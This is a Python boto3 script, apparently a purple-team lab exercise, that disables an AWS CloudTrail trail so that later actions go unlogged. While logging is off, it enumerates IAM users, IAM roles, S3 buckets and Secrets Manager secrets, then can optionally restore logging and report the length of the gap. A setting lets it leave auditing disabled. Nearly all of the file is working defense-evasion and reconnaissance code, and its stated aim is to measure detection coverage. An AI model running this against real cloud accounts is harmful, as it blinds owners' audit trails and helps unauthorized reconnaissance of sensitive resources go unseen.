"""
Purple Team Automation — Scenario 3: CloudTrail Disabling
Author: Omar (EY Internship — Purple Team Project)

Attack chain:
  Step 1 — Recon: find the active CloudTrail trail and confirm it's logging
  Step 2 — Verify: confirm current identity and permissions
  Step 3 — Kill: disable the trail (last logged event before the gap)
  Step 4 — Operate: perform actions during the blind window (invisible to CloudTrail)
  Step 5 — Measure: document the gap duration and restore logging

CloudTrail events produced:
  Step 1 → cloudtrail:DescribeTrails, cloudtrail:GetTrailStatus  (attacker identity)
  Step 2 → sts:GetCallerIdentity                                  (attacker identity)
  Step 3 → cloudtrail:StopLogging  ← LAST event before the gap
  Step 4 → NOTHING — all actions here are invisible
  Step 5 → cloudtrail:StartLogging ← first event after gap

Key insight: The gap itself is the detection signal — an analyst notices
the absence of events, not the presence of a specific bad event.

Output: timestamped terminal output + attack_log_scenario3.txt
"""

import boto3
import sys
import time
from datetime import datetime

# ============================================================
# CONFIG — edit these values before running on the target lab
# ============================================================
REGION     = "us-east-1"
TRAIL_NAME = "REPLACE-WITH-TRAIL-NAME"  # or leave as REPLACE for auto-discovery
LOG_FILE   = "attack_log_scenario3.txt"
RESTORE    = True   # True = re-enable trail after attack (recommended for lab)
                    # False = leave trail disabled (simulates destructive attacker)
# ============================================================


def log(message):
    """Print to terminal and write to log file simultaneously."""
    timestamped = f"[{datetime.utcnow().strftime('%Y-%m-%dT%H:%M:%SZ')}] {message}"
    print(timestamped)
    with open(LOG_FILE, "a") as f:
        f.write(timestamped + "\n")


# ----------------------------------------------------------
# Step 1: Recon — find the active CloudTrail trail
# ----------------------------------------------------------
def find_trail(region):
    log("STEP 1 — Recon: finding active CloudTrail trails")
    log("API calls: cloudtrail:DescribeTrails, cloudtrail:GetTrailStatus")

    ct = boto3.client('cloudtrail', region_name=region)

    try:
        trails = ct.describe_trails()['trailList']

        if not trails:
            log("ERROR — No trails found in this account")
            return None

        log(f"Found {len(trails)} trail(s):")
        active_trails = []

        for trail in trails:
            status = ct.get_trail_status(Name=trail['Name'])
            is_logging = status['IsLogging']

            log(f"  - Name        : {trail['Name']}")
            log(f"    ARN         : {trail['TrailARN']}")
            log(f"    Region      : {trail.get('HomeRegion', 'unknown')}")
            log(f"    Multi-region: {trail.get('IsMultiRegionTrail', False)}")
            log(f"    Logging     : {'ACTIVE' if is_logging else 'ALREADY DISABLED'}")

            if is_logging:
                active_trails.append(trail['Name'])

        if not active_trails:
            log("ERROR — No active trails found. Nothing to disable.")
            return None

        target = active_trails[0]
        log(f"Target trail selected: {target}")
        return target

    except Exception as e:
        log(f"ERROR — DescribeTrails failed: {e}")
        return None


# ----------------------------------------------------------
# Step 2: Verify — confirm current identity
# ----------------------------------------------------------
def verify_permissions(region):
    log("STEP 2 — Verifying current identity")
    log("API call: sts:GetCallerIdentity")

    sts = boto3.client('sts', region_name=region)

    try:
        identity = sts.get_caller_identity()
        log(f"Current identity confirmed:")
        log(f"  Account : {identity['Account']}")
        log(f"  ARN     : {identity['Arn']}")
        log(f"  UserID  : {identity['UserId']}")
        return identity['Arn']

    except Exception as e:
        log(f"ERROR — GetCallerIdentity failed: {e}")
        return None


# ----------------------------------------------------------
# Step 3: Kill — disable CloudTrail logging
# ----------------------------------------------------------
def stop_trail(trail_name, region):
    log(f"STEP 3 — Disabling CloudTrail: {trail_name}")
    log(f"API call: cloudtrail:StopLogging")
    log(f"CRITICAL: This is the LAST event CloudTrail will record before the gap")

    ct = boto3.client('cloudtrail', region_name=region)

    try:
        ct.stop_logging(Name=trail_name)
        gap_start = datetime.utcnow()

        log(f"SUCCESS — Trail disabled. Logging is now OFF.")
        log(f"Gap started at: {gap_start.strftime('%Y-%m-%dT%H:%M:%SZ')}")
        log(f"Any API calls made after this point will NOT appear in CloudTrail")

        return gap_start

    except Exception as e:
        log(f"ERROR — StopLogging failed: {e}")
        log(f"Possible reason: insufficient permissions (cloudtrail:StopLogging required)")
        return None


# ----------------------------------------------------------
# Step 4: Operate — actions during the blind window
# ----------------------------------------------------------
def operate_in_gap(region):
    log("STEP 4 — Operating during blind window (logging is OFF)")
    log("WARNING: None of the following API calls will appear in CloudTrail")
    log("This simulates what an attacker does during the gap")

    iam = boto3.client('iam',  region_name=region)
    s3  = boto3.client('s3',   region_name=region)
    sm  = boto3.client('secretsmanager', region_name=region)

    # Action 1: enumerate IAM users (invisible recon)
    try:
        users = iam.list_users()['Users']
        log(f"[BLIND] Listed {len(users)} IAM user(s) — NOT logged in CloudTrail:")
        for user in users:
            log(f"  - {user['UserName']} (created: {user['CreateDate']})")
    except Exception as e:
        log(f"[BLIND] Could not list IAM users: {e}")

    # Action 2: enumerate IAM roles (invisible recon)
    try:
        roles = iam.list_roles()['Roles']
        log(f"[BLIND] Listed {len(roles)} IAM role(s) — NOT logged in CloudTrail:")
        for role in roles:
            log(f"  - {role['RoleName']}")
    except Exception as e:
        log(f"[BLIND] Could not list IAM roles: {e}")

    # Action 3: enumerate S3 buckets (invisible recon)
    try:
        buckets = s3.list_buckets()['Buckets']
        log(f"[BLIND] Listed {len(buckets)} S3 bucket(s) — NOT logged in CloudTrail:")
        for bucket in buckets:
            log(f"  - {bucket['Name']}")
    except Exception as e:
        log(f"[BLIND] Could not list S3 buckets: {e}")

    # Action 4: enumerate secrets (invisible recon)
    try:
        secrets = sm.list_secrets()['SecretList']
        log(f"[BLIND] Listed {len(secrets)} secret(s) — NOT logged in CloudTrail:")
        for secret in secrets:
            log(f"  - {secret['Name']}")
    except Exception as e:
        log(f"[BLIND] Could not list secrets: {e}")

    log("Gap operations complete — attacker performed full recon invisibly")


# ----------------------------------------------------------
# Step 5: Restore — re-enable logging and measure gap
# ----------------------------------------------------------
def restore_trail(trail_name, gap_start, region):
    log(f"STEP 5 — Restoring CloudTrail logging: {trail_name}")
    log(f"API call: cloudtrail:StartLogging")
    log(f"Note: This is the first event CloudTrail records after the gap")

    ct = boto3.client('cloudtrail', region_name=region)

    try:
        ct.start_logging(Name=trail_name)
        gap_end      = datetime.utcnow()
        gap_seconds  = (gap_end - gap_start).total_seconds()
        gap_minutes  = gap_seconds / 60

        log(f"SUCCESS — Logging restored")
        log(f"")
        log(f"GAP ANALYSIS (for Detection Coverage Register):")
        log(f"  Gap started        : {gap_start.strftime('%Y-%m-%dT%H:%M:%SZ')}")
        log(f"  Gap ended          : {gap_end.strftime('%Y-%m-%dT%H:%M:%SZ')}")
        log(f"  Total duration     : {gap_seconds:.1f} seconds ({gap_minutes:.1f} minutes)")
        log(f"  Actions in gap     : IAM enum, S3 enum, Secrets enum")
        log(f"  Analyst visibility : ZERO during gap")
        log(f"  First visible event: cloudtrail:StopLogging (before gap)")
        log(f"  Next visible event : cloudtrail:StartLogging (after gap)")
        log(f"  What analyst sees  : suspicious gap in log stream + StopLogging event")

    except Exception as e:
        log(f"ERROR — StartLogging failed: {e}")
        log(f"IMPORTANT: Trail is still disabled — restore manually in AWS Console")
        log(f"Console: CloudTrail → Trails → {trail_name} → Enable logging")


# ----------------------------------------------------------
# Main — wire all steps together
# ----------------------------------------------------------
def main():
    log("=" * 60)
    log("Purple Team — Scenario 3: CloudTrail Disabling")
    log("=" * 60)
    log(f"Region     : {REGION}")
    log(f"Trail name : {TRAIL_NAME}")
    log(f"Restore    : {RESTORE}")
    log("=" * 60)

    # Step 1 — find active trail
    # Auto-discovery if TRAIL_NAME not configured, direct use if it is
    if "REPLACE" in TRAIL_NAME:
        log("Trail name not configured — auto-discovering...")
        trail_name = find_trail(REGION)
        if not trail_name:
            log("ABORTED — Could not find an active trail. Stopping.")
            sys.exit(1)
    else:
        trail_name = TRAIL_NAME
        log(f"Using configured trail: {trail_name}")

    # Step 2 — verify identity
    identity = verify_permissions(REGION)
    if not identity:
        log("ABORTED — Could not verify identity. Stopping.")
        sys.exit(1)

    # Step 3 — disable the trail
    gap_start = stop_trail(trail_name, REGION)
    if not gap_start:
        log("ABORTED — Could not disable trail. Stopping.")
        sys.exit(1)

    # Step 4 — operate in the blind window
    operate_in_gap(REGION)

    # Step 5 — restore and measure gap
    if RESTORE:
        restore_trail(trail_name, gap_start, REGION)
    else:
        log("RESTORE=False — Trail left disabled intentionally")
        log("IMPORTANT: Re-enable manually: aws cloudtrail start-logging --name " + trail_name)

    log("=" * 60)
    log("ATTACK CHAIN COMPLETE")
    log(f"Review {LOG_FILE} for full timestamped gap analysis")
    log("=" * 60)


if __name__ == "__main__":
    main()
